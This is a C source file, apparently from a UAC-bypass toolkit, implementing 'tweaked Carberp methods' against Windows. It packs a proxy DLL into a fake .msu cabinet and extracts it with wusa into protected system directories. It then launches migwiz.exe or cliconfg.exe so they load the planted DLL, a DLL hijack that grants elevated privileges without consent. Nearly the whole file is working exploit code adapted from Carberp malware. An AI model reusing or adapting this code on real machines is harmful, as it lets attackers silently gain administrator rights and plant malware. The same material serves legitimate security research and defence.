/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       CARBERP.C
*
*  VERSION:     2.75
*
*  DATE:        30 June 2017
*
*  Tweaked Carberp methods.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu package then run target application.
*
*/
BOOL ucmWusaMethod(
    _In_ UCM_METHOD Method,
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL   bResult = FALSE;
    WCHAR  szSourceDll[MAX_PATH * 2];
    WCHAR  szTargetProcess[MAX_PATH * 2];
    WCHAR  szTargetDirectory[MAX_PATH * 2];

    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
        return FALSE;
    }

    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
    _strcpy(szTargetDirectory, g_ctx.szSystemDirectory);
    _strcpy(szSourceDll, g_ctx.szTempDirectory);

    switch (Method) {

    // 
    // Use migwiz.exe as target.
    // szTargetDirectory is system32\migwiz
    //
    case UacMethodCarberp1:
        _strcat(szSourceDll, WDSCORE_DLL);
        _strcat(szTargetDirectory, MIGWIZ_DIR);
        _strcat(szTargetProcess, MIGWIZ_DIR);
        _strcat(szTargetProcess, MIGWIZ_EXE);
        break;

    //
    // Use cliconfg.exe as target.
    // szTargetDirectory is system32
    //
    case UacMethodCarberp2:
        _strcat(szSourceDll, NTWDBLIB_DLL);       
        _strcat(szTargetProcess, CLICONFG_EXE);
        break;

    default:
        return FALSE;
    }

    if (!PathFileExists(szTargetProcess)) {
        supDebugPrint(TEXT("ucmWusaMethod"), ERROR_FILE_NOT_FOUND);
        return FALSE;
    }

    //
    // Extract file to the protected directory
    // First, create cab with fake msu ext, second run fusion process.
    //
    if (ucmCreateCabinetForSingleFile(
        szSourceDll, 
        ProxyDll, 
        ProxyDllSize, 
        NULL)) 
    {

        if (ucmWusaExtractPackage(szTargetDirectory)) {
            //run target process for dll hijacking
            bResult = supRunProcess(szTargetProcess, NULL);
        }
        ucmWusaCabinetCleanup();
    }

    return bResult;
}
